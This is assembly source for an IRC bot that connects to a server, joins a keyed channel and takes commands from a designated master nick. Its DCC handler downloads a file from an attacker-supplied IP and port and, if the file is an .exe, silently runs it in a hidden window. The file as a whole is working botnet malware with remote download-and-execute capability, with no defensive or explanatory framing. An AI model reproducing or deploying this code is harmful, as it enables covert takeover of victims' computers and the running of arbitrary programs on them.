IrcConnect proto :dword, :dword, :dword, :dword
IrcThread proto :dword
ParseLine proto :dword, :dword, :dword
DccReceive proto :dword

IRC_CONNECT struct
  dwsocket                dword ?
  dwserver                dword ?
  dwport                  dword ?
  bsync                   byte ?
  sznick                  byte 64 dup (?)
  szchan                  byte 64 dup (?)
IRC_CONNECT ends

DCC_RECEIVE struct
  bsync                   byte ?
  szfile                  byte 64 dup (?)
  szip                    byte 64 dup (?)
  szport                  byte 64 dup (?)
  szsize                  byte 64 dup (?)
DCC_RECEIVE ends

.data
szCrLf                    byte 10
szExe                     byte 'exe', 0

.data?
szIrcBuffer               byte 1024 dup (?)
szLineBuffer              byte 1024 dup (?)
szArgumentBuffer          byte 1024 dup (?)
szBotCommand              byte 64 dup (?)
szCommand                 byte 64 dup (?)
szFrom                    byte 64 dup (?)
szPort                    byte 32 dup (?)
szTo                      byte 64 dup (?)
szEXE                     byte 32 dup (?)

.code
IrcConnect proc szChannel:dword, szNick:dword, szServer:dword, dwPort:dword
local irc:IRC_CONNECT
mov eax, dwPort
mov irc.dwport, eax
invoke CopyMemory, addr irc.szchan, szChannel, 64
invoke CopyMemory, addr irc.sznick, szNick, 64
invoke gethostbyname, szServer
mov eax, [eax + 12]
mov eax, [eax]
mov eax, [eax]
mov irc.dwserver, eax
invoke CreateThread, 0, 0, addr IrcThread, addr irc, 0, 0
push eax
.while irc.bsync != 1
  invoke Sleep, 10
.endw
invoke dwtoa, dwServerPort, addr szPort
invoke wsprintf, addr szIrcBuffer, addr szIrcThread, szServer, addr szPort
pop eax
invoke AddThread, eax, addr szIrcBuffer, irc.dwsocket, 0
ret
IrcConnect endp

IrcThread proc uses eax ebx ecx esi edi lpParam:dword
local irc:IRC_CONNECT
local dwSocket:dword
local dwLen:dword
local dwMax:dword
local SockAddrIn:sockaddr_in
invoke CopyMemory, addr irc, lpParam, sizeof irc
@@:
invoke socket, PF_INET, SOCK_STREAM, 0
mov dwSocket, eax
mov eax, lpParam
assume eax:ptr IRC_CONNECT
mov ecx, dwSocket
mov [eax].dwsocket, ecx
mov [eax].bsync, 1
assume eax:nothing
mov SockAddrIn.sin_family, AF_INET
invoke htons, irc.dwport
mov SockAddrIn.sin_port, ax
mov eax, irc.dwserver
mov SockAddrIn.sin_addr, eax
invoke connect, dwSocket, addr SockAddrIn, sizeof SockAddrIn
.if eax == SOCKET_ERROR
  invoke Sleep, 15000
  jmp @B
.endif
invoke wsprintf, addr szIrcBuffer, addr szNICK, addr irc.sznick
invoke lstrlen, addr szIrcBuffer
mov ecx, eax
invoke send, dwSocket, addr szIrcBuffer, ecx, 0
invoke wsprintf, addr szIrcBuffer, addr szUSER, addr irc.sznick, addr irc.sznick
invoke lstrlen, addr szIrcBuffer
mov ecx, eax
invoke send, dwSocket, addr szIrcBuffer, ecx, 0
.while TRUE
  invoke Sleep, 1
  invoke RtlZeroMemory, addr szIrcBuffer, 1022
  invoke recv, dwSocket, addr szIrcBuffer, sizeof szIrcBuffer, 0
  .if eax < 1
    jmp recverror
  .endif
  mov esi, offset szIrcBuffer
  mov edi, offset szLineBuffer
  lea ecx, [esi+eax-2]
  mov dwLen, ecx
  lea ecx, [esi+1022]
  mov dwMax, ecx
  .while esi <= dwLen && esi <= dwMax
    lodsb
    .if al == 0
      jmp recvdone
    .endif  
    .if al == 13
      lodsb
      .if al == 10
        mov al, 0
        stosb
        invoke ParseLine, dwSocket, addr szLineBuffer, addr irc.szchan
        mov edi, offset szLineBuffer
        .continue
      .endif
    .endif
    stosb
  .endw
  recvdone:
.endw
recverror:
invoke closesocket, dwSocket
ret
IrcThread endp

SendMsg proc uses eax ecx esi edi dwSocket:dword, szUser:dword, szMessage:dword
local szEncryptedBuffer[1024]:byte
local szMsgBuffer[1024]:byte
invoke lstrcpy, addr szEncryptedBuffer, szMessage
;#NO_IRC_ENCRYPTION 1
;invoke Encrypt, addr szEncryptedBuffer
invoke wsprintf, addr szMsgBuffer, addr szMSG, szUser, addr szEncryptedBuffer
invoke lstrlen, addr szMsgBuffer
mov ecx, eax
invoke send, dwSocket, addr szMsgBuffer, ecx, 0
ret
SendMsg endp

ParseLine proc uses eax ebx ecx esi edi dwSocket:dword, dwcommandline:dword, szChannel:dword
local dwCommandLine[1024]:dword
local dcc:DCC_RECEIVE
invoke lstrcpy, addr dwCommandLine, dwcommandline
invoke lstrlen, addr dwCommandLine
.if eax == 0
  ret
.endif
invoke GetToken, addr szParseBuffer, addr dwCommandLine, 32, 1, FALSE
invoke lstrcmpi, addr szParseBuffer, addr szPING
.if eax == 0
  invoke GetToken, addr szParseBuffer, addr dwCommandLine, 32, 2, FALSE
  lea eax, offset szParseBuffer + 1
  invoke wsprintf, addr szIrcBuffer, addr szPONG, eax
  invoke lstrlen, addr szIrcBuffer
  mov ecx, eax
  invoke send, dwSocket, addr szIrcBuffer, ecx, 0
  jmp done
.endif
lea eax, offset szParseBuffer + 1
invoke lstrcpy, addr szFrom, eax
invoke GetToken, addr szParseBuffer, addr szFrom, 33, 1, FALSE
invoke lstrcpy, addr szFrom, addr szParseBuffer
invoke GetToken, addr szCommand, addr dwCommandLine, 32, 2, FALSE
invoke lstrcmpi, addr szCommand, addr sz001
.if eax == 0
  invoke wsprintf, addr szIrcBuffer, addr szJOIN, szChannel, addr szKey
  invoke lstrlen, addr szIrcBuffer
  mov ecx, eax
  invoke send, dwSocket, addr szIrcBuffer, ecx, 0
.endif
invoke lstrcmpi, addr szCommand, addr sz005
.if eax == 0
  invoke wsprintf, addr szIrcBuffer, addr szJOIN, szChannel, addr szKey
  invoke lstrlen, addr szIrcBuffer
  mov ecx, eax
  invoke send, dwSocket, addr szIrcBuffer, ecx, 0
.endif
invoke lstrcmpi, addr szCommand, addr sz433
.if eax == 0
  invoke GetRandNick
  invoke lstrcpy, addr szRandNick, dwNickPointer
  invoke GetTickCount
  xor ecx, ecx
  xor al, ah
  mov cl, al
  invoke dwtoa, ecx, addr szRandNum
  invoke lstrcat, addr szRandNick, addr szRandNum
  invoke wsprintf, addr szIrcBuffer, addr szNICK, addr szRandNick
  invoke lstrlen, addr szIrcBuffer
  mov ecx, eax
  invoke send, dwSocket, addr szIrcBuffer, ecx, 0
.endif
invoke lstrcmpi, addr szCommand, addr szPRIVMSG
.if eax == 0
  invoke GetToken, addr szTo, addr dwCommandLine, 32, 3, FALSE
  invoke GetToken, addr szParseBuffer, addr dwCommandLine, 32, 4, TRUE
  mov esi, offset szParseBuffer
  mov edi, offset szParseBuffer
  add esi, 2
  @@:
  mov al, [esi]
  inc esi
  mov [edi], al
  inc edi
  cmp al, 0
  je @F
  jmp @B
  @@:
  invoke GetToken, addr szBotCommand, addr szParseBuffer, 32, 1, FALSE
  invoke lstrcmpi, addr szBotCommand, addr szDCC
  .if eax == 0
    invoke lstrcmpi, addr szFrom, addr szMaster
    .if eax == 0
      mov dcc.bsync, 0
      invoke GetToken, addr dcc.szfile, addr szParseBuffer, 32, 3, FALSE
      invoke GetToken, addr dcc.szip, addr szParseBuffer, 32, 4, FALSE
      invoke GetToken, addr dcc.szport, addr szParseBuffer, 32, 5, FALSE
      invoke GetToken, addr dcc.szsize, addr szParseBuffer, 32, 6, FALSE
      invoke lstrlen, addr dcc.szsize
      dec eax
      invoke lstrcpyn, addr szParseBuffer, addr dcc.szsize, eax
      invoke lstrcpy, addr dcc.szsize, addr szParseBuffer
      invoke CreateThread, 0, 16384, addr DccReceive, addr dcc, 0, 0
      push eax
      .while dcc.bsync != 1
        invoke Sleep, 10
      .endw
      pop eax
      invoke CloseHandle, eax
    .endif
    jmp done
  .endif  
  ;#NO_IRC_ENCRYPTION 1
;  invoke Decrypt, addr szParseBuffer
  invoke GetToken, addr szBotCommand, addr szParseBuffer, 32, 1, FALSE
  invoke GetToken, addr szArgumentBuffer, addr szParseBuffer, 32, 2, TRUE
  mov esi, offset szTo
  mov al, [esi]
  .if al == 35
     invoke ParseCommand, dwSocket, addr szFrom, addr szTo, addr szBotCommand, addr szArgumentBuffer
  .else
    invoke ParseCommand, dwSocket, addr szFrom, addr szFrom, addr szBotCommand, addr szArgumentBuffer
  .endif
.endif
done:
ret
ParseLine endp

DccReceive proc lpParam: dword
local dcc:DCC_RECEIVE
local dccbuf[64]:byte
local dwBytes:dword
local dwBytesWritten:dword
local dwTotalBytes:dword
local dwBytesReceived:dword
local dwSocket:dword
local dwMode:dword
local hFile:dword
local SockAddrIn:sockaddr_in
local DCCbuffer[8192]:byte
invoke CopyMemory, addr dcc, lpParam, sizeof dcc
mov eax, lpParam
assume eax:ptr DCC_RECEIVE
mov [eax].bsync, 1
assume eax:nothing
invoke socket, PF_INET, SOCK_STREAM, 0
mov dwSocket, eax
mov SockAddrIn.sin_family, AF_INET
invoke atodw, addr dcc.szport
invoke htons, eax
mov SockAddrIn.sin_port, ax
invoke atodw, addr dcc.szip
invoke htonl, eax
mov SockAddrIn.sin_addr, eax
invoke connect, dwSocket, addr SockAddrIn, sizeof SockAddrIn
mov dwMode, 1
invoke ioctlsocket, dwSocket, FIONBIO, addr dwMode
invoke CreateFile, addr dcc.szfile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0
mov hFile, eax
invoke atodw, addr dcc.szsize
invoke htonl, eax
mov dwTotalBytes, eax
mov dwBytesReceived, 0
@@:
recvloop:
invoke Sleep, 1
invoke recv, dwSocket, addr DCCbuffer, 8192, 0
mov dwBytes, eax
.if eax == SOCKET_ERROR || eax == 0
  invoke WSAGetLastError
  .if eax == WSAEWOULDBLOCK
    jmp recvloop
  .else
    jmp enddcc
  .endif  
.endif
mov eax, dwBytesReceived
add eax, dwBytes
mov dwBytesReceived, eax
invoke WriteFile, hFile, addr DCCbuffer, dwBytes, addr dwBytesWritten, 0
sendloop:
invoke Sleep, 1
invoke ntohl, dwBytesReceived
mov dwBytes, eax
invoke send, dwSocket, addr dwBytes, 4, 0
.if eax == SOCKET_ERROR
  invoke WSAGetLastError
  .if eax == WSAEWOULDBLOCK
    jmp sendloop
  .endif  
.endif  
jmp @B
enddcc:
invoke CloseHandle, hFile
invoke closesocket, dwSocket
invoke lstrcpy, addr szEXE, addr dcc.szfile
invoke lstrlen, addr szEXE
mov ecx, eax
sub ecx, 3
mov esi, offset szEXE
add esi, ecx
mov edi, offset szEXE
movsb
movsb
movsb
mov al, 0
stosb
invoke lstrcmpi, addr szEXE, addr szExe
.if eax == 0
  mov sStartupInfo.dwFlags, STARTF_USESHOWWINDOW
  mov sStartupInfo.wShowWindow, SW_HIDE
  invoke CreateProcess, 0, addr dcc.szfile, 0, 0, FALSE, 0, 0, 0, addr sStartupInfo, addr sProcessInfo
.endif
ret
DccReceive endp
